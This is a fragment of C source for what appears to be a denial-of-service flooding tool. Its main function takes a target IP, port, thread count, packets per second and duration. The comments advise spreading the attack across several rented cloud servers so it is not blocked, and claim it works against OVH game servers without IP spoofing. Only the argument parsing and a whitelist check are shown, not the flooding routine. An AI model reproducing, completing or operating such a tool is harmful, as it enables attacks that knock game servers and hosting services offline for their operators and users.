...
//best use advice for this script : used multiple servers for avoided to do this bloqued attack
//This script does not need ip spoofing and works on OVHGAME,you can buy servers on clouds like: digitalocean,vultr,linode.. 
...
int main(int argc, char *argv[ ])
{
	if(argc < 6){
		...
		fprintf(stdout, "usage: %s <ip> <port> <thread> <pps> <time>\n", argv[0]);
		exit(-1);
	}
	whitelistcheck();
